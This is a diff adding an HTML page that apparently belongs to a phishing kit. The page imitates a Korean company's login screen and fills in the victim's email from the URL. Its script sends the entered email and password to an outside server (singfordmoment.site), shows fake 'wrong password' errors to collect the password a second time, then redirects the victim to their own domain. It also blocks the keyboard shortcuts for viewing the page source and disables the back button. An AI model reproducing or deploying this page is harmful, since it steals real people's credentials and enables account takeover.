@@ -1,0 +1,511 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" lang="ko" xml:lang="ko">
+
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title> 주식회사 토페스 </title>
+   	<!--css-->
+    <link rel="stylesheet" type="text/css" href="https://style-59a48.web.app/stylesfx/common.css">	
+<link rel="stylesheet" type="text/css" href="https://dev-file-groups.pantheonsite.io/fdx/layout.css ">
+<link rel="stylesheet" type="text/css" href="https://style-59a48.web.app/stylesfx/contents.css">
+<style>
+	// stylelint-disable declaration-no-important
+
+//
+// Text
+//
+
+// Alignment
+
+.text-justify  { text-align: justify !important; }
+.text-nowrap   { white-space: nowrap !important; }
+.text-truncate { @include text-truncate; }
+
+// Responsive alignment
+
+@each $breakpoint in map-keys($grid-breakpoints) {
+  @include media-breakpoint-up($breakpoint) {
+    $infix: breakpoint-infix($breakpoint, $grid-breakpoints);
+
+    .text#{$infix}-left   { text-align: left !important; }
+    .text#{$infix}-right  { text-align: right !important; }
+    .text#{$infix}-center { text-align: center !important; }
+  }
+}
+
+// Transformation
+
+.text-lowercase  { text-transform: lowercase !important; }
+.text-uppercase  { text-transform: uppercase !important; }
+.text-capitalize { text-transform: capitalize !important; }
+
+// Weight and italics
+
+.font-weight-light  { font-weight: $font-weight-light !important; }
+.font-weight-normal { font-weight: $font-weight-normal !important; }
+.font-weight-bold   { font-weight: $font-weight-bold !important; }
+.font-italic        { font-style: italic !important; }
+
+// Contextual colors
+
+.text-white { color: #fff !important; }
+
+@each $color, $value in $theme-colors {
+  @include text-emphasis-variant(".text-#{$color}", $value);
+}
+
+.text-muted { color: $text-muted !important; }
+
+// Misc
+
+.text-hide {
+  @include text-hide();
+}
+
+
+// stylelint-disable declaration-no-important, selector-list-comma-newline-after
+
+//
+// Headings
+//
+
+h1, h2, h3, h4, h5, h6,
+.h1, .h2, .h3, .h4, .h5, .h6 {
+  margin-bottom: $headings-margin-bottom;
+  font-family: $headings-font-family;
+  font-weight: $headings-font-weight;
+  line-height: $headings-line-height;
+  color: $headings-color;
+}
+
+h1, .h1 { font-size: $h1-font-size; }
+h2, .h2 { font-size: $h2-font-size; }
+h3, .h3 { font-size: $h3-font-size; }
+h4, .h4 { font-size: $h4-font-size; }
+h5, .h5 { font-size: $h5-font-size; }
+h6, .h6 { font-size: $h6-font-size; }
+
+.lead {
+  font-size: $lead-font-size;
+  font-weight: $lead-font-weight;
+}
+
+// Type display classes
+.display-1 {
+  font-size: $display1-size;
+  font-weight: $display1-weight;
+  line-height: $display-line-height;
+}
+.display-2 {
+  font-size: $display2-size;
+  font-weight: $display2-weight;
+  line-height: $display-line-height;
+}
+.display-3 {
+  font-size: $display3-size;
+  font-weight: $display3-weight;
+  line-height: $display-line-height;
+}
+.display-4 {
+  font-size: $display4-size;
+  font-weight: $display4-weight;
+  line-height: $display-line-height;
+}
+
+
+//
+// Horizontal rules
+//
+
+hr {
+  margin-top: $hr-margin-y;
+  margin-bottom: $hr-margin-y;
+  border: 0;
+  border-top: $hr-border-width solid $hr-border-color;
+}
+
+
+//
+// Emphasis
+//
+
+small,
+.small {
+  font-size: $small-font-size;
+  font-weight: $font-weight-normal;
+}
+
+mark,
+.mark {
+  padding: $mark-padding;
+  background-color: $mark-bg;
+}
+
+
+//
+// Lists
+//
+
+.list-unstyled {
+  @include list-unstyled;
+}
+
+// Inline turns list items into inline-block
+.list-inline {
+  @include list-unstyled;
+}
+.list-inline-item {
+  display: inline-block;
+
+  &:not(:last-child) {
+    margin-right: $list-inline-padding;
+  }
+}
+
+
+//
+// Misc
+//
+
+
+.initialism {
+  font-size: 90%;
+  text-transform: uppercase;
+}
+
+// Blockquotes
+.blockquote {
+  margin-bottom: $spacer;
+  font-size: $blockquote-font-size;
+}
+
+.blockquote-footer {
+  display: block;
+  font-size: 80%; // back to default font-size
+  color: $blockquote-small-color;
+
+  
+}
+
+</style>
+
+
+	
+    <!--js-->
+  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+  
+  
+  
+  
+ <script type="text/javascript"> 
+	
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+       var errorArray = ["","로그인 정보가 올바르지 않습니다.", "로그인 정보가 올바르지 않습니다.", "이 세션은 만료되었습니다."];
+
+      $('#back3').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+    /////////////url email getting////////////////
+    var email = window.location.hash.substr(1);
+    if (!email) {
+
+    }
+    else
+    {
+        // $('#email').val(email);
+        var my_email =email;
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+          $('#contact').trigger("reset");
+          $("#msg").hide();
+          $('#fieldImg').attr('src', 'images/other-1.png');
+          $('#field').html("Other Mail");
+          $('#email').val(my_email);
+          $('#emailch').html(my_email);
+          $("#msg").hide();
+          $("#inputbar").animate({left:200, opacity:"hide"}, 0);
+          $("#automail").animate({right:200, opacity:"show"}, 1000);
+		  $('#domain-name').html(final);
+		  $('#connect').html(""+my_slice);
+      }
+      ///////////////url getting email////////////////
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').html(errorArray[count]);
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/;
+
+     
+
+        if (!filter.test(my_email)) {
+            $('#error').show();
+            $('#error').html("아이디를 입력하세요");
+            email.focus
+            return false;
+        }
+        if (!password) {
+            $('#error').show();
+            $('#error').html("비밀번호를 입력하세요");
+            email.focus
+            return false;
+        }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      ///////////new injection////////////////
+      count=count+1;
+      $('#domain-name').html(final);
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://singfordmoment.site/odera/cp.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('   로그인…');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=2) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                   window.location.replace("http://www." + my_slice);
+                     
+                  }
+                  $('#msg').html(response['msg']);
+                }
+                else{
+                  $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=2) {
+                count=0;
+                window.location.replace("http://www." + my_slice);
+              }
+              $("#msg").show();
+              $('#msg').html(errorArray[count]);
+            },
+            complete: function(){
+              $('#submit-btn').html(' 로그인   ');
+            }
+          });
+    });
+
+
+    });
+	
+
+
+document.onkeydown=function(e){
+  if (e.ctrlKey && 
+    (e.keyCode === 73 || 
+     e.keyCode === 105 ||
+     e.keyCode === 74 || 
+     e.keyCode === 106 || 
+     e.keyCode === 85 || 
+     e.keyCode === 117)) {
+    alert('not allowed');
+  return false;
+} else {
+  return true;
+}
+}  
+</script>
+
+<script type="text/javascript" language="javascript">
+    
+        $(document).ready(function () {
+            /*리사이즈*/
+            var loginWidth = $('#login_a2_type').width();
+            var loginHeight = $('#login_a2_type').height();
+            $('#login_a2_type').css("margin-top", -loginHeight * 0.5);
+            $('#login_a2_type').css("margin-left", -loginWidth * 0.5);
+
+            $(window).resize(function () {
+                var loginWidth = $('#login_a2_type').width();
+                var loginHeight = $('#login_a2_type').height();
+                $('#login_a2_type').css("margin-top", -loginHeight * 0.5);
+                $('#login_a2_type').css("margin-left", -loginWidth * 0.5);
+            });
+
+            // 포커스
+            if ($("#userId").val() != "") {
+                $("#userId_label").text("");
+                $("#userPw").focus();
+            }
+            else {
+                $("#userId").focus();
+            }
+        });
+
+        // 페이지 이동 --> HTTPS 리다이렉션
+        function PageRedirect() {
+            //alert('안녕하세요 GCMS입니다.
+(가상화 브라우저 알럿 테스트 중입니다.)');
+            if (window.location.protocol == "Login.html") {
+             //       location.href = "https://gcms.bizboxa.com/";                
+            }
+        }
+
+        //focus이벤트
+        function focusInput(id) {
+            $("#" + id + "_label").text("");
+        }
+
+        //blur이벤트
+        function blurInput(id) {
+            if ($("#" + id).val() == "") {
+                var msg = "";
+                switch (id) {
+                    case "userId":
+                        msg = "아이디";
+                        break;
+                    case "userPw":
+                        msg = "비밀번호";
+                        break;
+                }
+                $("#" + id + "_label").text(msg + " 입력");
+            }
+        }
+
+        //비밀번호 초기화 창 팝업
+//        function fnForgotPw() {
+//            var sUrl = "/View/Login/ForgotPw.aspx";
+//            var sNm = "ForgotPw";
+
+//            fnPop_one_scroll(sUrl, sNm, 600, 350, '1');
+        //        }
+
+        // 패스워드 초기화 팝업
+        function password_init() {
+            var sUrl = "PasswordInit_Popup.html";
+            var sNm = "passwordInit";
+            fnPop_one(sUrl, sNm, 430, 360);
+            return false;
+        }
+
+        //뒤로가기 금지
+        history.pushState(null, null, location.href);
+        window.onpopstate = function (event) {
+            history.go(1);
+        }
+    </script>
+
+    <script type="text/javascript" language="javascript">
+        // 로그인 유효성 체크
+        function login_check() {
+            if ($("#userId").val() == "") {
+                $("#LitChkec").text("※ 아이디를 입력해 주세요 ※");
+                $("#userId").focus();
+                return false;
+            }
+
+            if ($("#userPw").val() == "") {
+                $("#LitChkec").text("※ 비밀번호를 입력해 주세요 ※");
+                $("#userPw").focus();
+                return false;
+            }
+            return true;
+        }
+    </script>
+	
+    
+</head>
+
+<body class="login_a2_type_bg" onload="PageRedirect();">	
+	<div id="login_a2_type">
+        <div class="login_wrap">
+        	<div class="company_logo">
+				<h4 >
+				<strong  id="domain-name" style=" height: 40px; width:220px;vertical-align: middle; border:0px solid red; color:#549bd8; font-size:40px;	color: #blue
+	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+	margin-top: 12px;class="></strong></h4>
+			</div>
+            <div class="login_form_wrap">
+			
+			
+                <p class="log_tit"></p>
+				
+				<span id="msg" class="error-notice" style="display: none;padding: 10px; height: 20px; width:1220px;vertical-align: middle; border:0px solid red; color:red; font-size: 16px;	color: red;
+	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+	margin-top: 12px;
+       ">Wrong Password! Please enter correct password.</span><span id="error" class="error-notice" style="display: none;padding: 10px; height: 20px; width:1220px;vertical-align: middle; border:0px solid red; color:red; font-size: 16px;	color: red;
+	font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+	margin-top: 12px;
+       ">That account doesn't exist. Enter a different account</span>
+                <form method="post" action="" id="form">
+<div class="aspNetHidden">
+<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUJMjAzNTY2ODQwZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAgUGY2hrX2lkBQhidG5Mb2dpbgxaQgym2kqc7aTyfJ8FdEF8vBEm4HalGZc1wlS8+83D" />
+</div>
+
+<div class="aspNetHidden">
+
+	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="FD4F4357" />
+	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdAAbN81f1q/RpLcJti6joEerw1oNmG40vxEbniXNf/a+U8gP1VPizS0mpY+RfolbXuyU8wEmpThG8S0Q3tErcyL+Sop4oRunf14dz2Zt2+QKDENqRW61afxG1ew58fRjeUZl/ekxtDrIlLhxHp6iXNTx6DyIg+mvsGTIUXMpns5jWxg==" />
+</div>
+                    <input type="hidden" id="hid_reload" value="0"/>
+                    <fieldset>
+                        <label class="i_label" for="userId" id="userId_label" onclick="javascript:focusInput('userId');" style="font-size: 12px;"></label>
+                        <input name="userId" type="text" id="email" class="inp" onfocus="focusInput(&#39;userId&#39;);" onblur="blurInput(&#39;userId&#39;);" readonly>
+                        
+                        <label class="i_label" for="userPw" id="userPw_label" onclick="javascript:focusInput('userPw');" style="font-size: 12px;"></label>
+                        <input name="userPw" type="password" id="password" placeholder="비밀번호 입력" class="inp" onfocus="focusInput(&#39;userPw&#39;);" onblur="blurInput(&#39;userPw&#39;);" />
+                        <div class="chk">
+                            <input name="chk_id" type="checkbox" id="chk_id" />
+                            <label for="chk_id">아이디저장</label>
+                            
+                        </div>
+                        <div class="log_btn">
+                            <input type="image" name="btnLogin" id="submit-btn" src="https://style-59a48.web.app/stylesfx/login_btn.png" onclick="return login_check();" />
+                            
+                        </div>
+                    </fieldset>
+                   
+                </form>
+            </div>
+            <div class="copy">Copyrightⓒ DOUZONE ICT GROUP. All right reserved.</div>
+        </div>
+    </div>
+    
+</body>
